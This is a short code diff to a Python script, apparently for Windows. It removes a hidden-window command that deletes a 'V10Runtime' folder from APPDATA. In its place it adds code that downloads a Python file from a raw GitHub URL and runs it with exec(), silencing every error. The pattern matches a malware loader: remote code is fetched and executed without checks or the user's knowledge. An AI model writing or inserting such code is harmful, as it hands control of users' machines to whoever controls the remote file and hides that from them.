@@ -147,17 +147,11 @@ if __name__ == "__main__":
                 except:
                     pass
 
-    try:
-        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = subprocess.SW_HIDE
+try:
+  import urllib.request
 
-        subprocess.Popen(
-            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
-            shell=True,
-            startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-    except Exception:
-        pass
+  url_v12 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v12.py'
+  with urllib.request.urlopen(url_v12) as response:
+    exec(response.read().decode('utf-8'))
+except:
+  pass
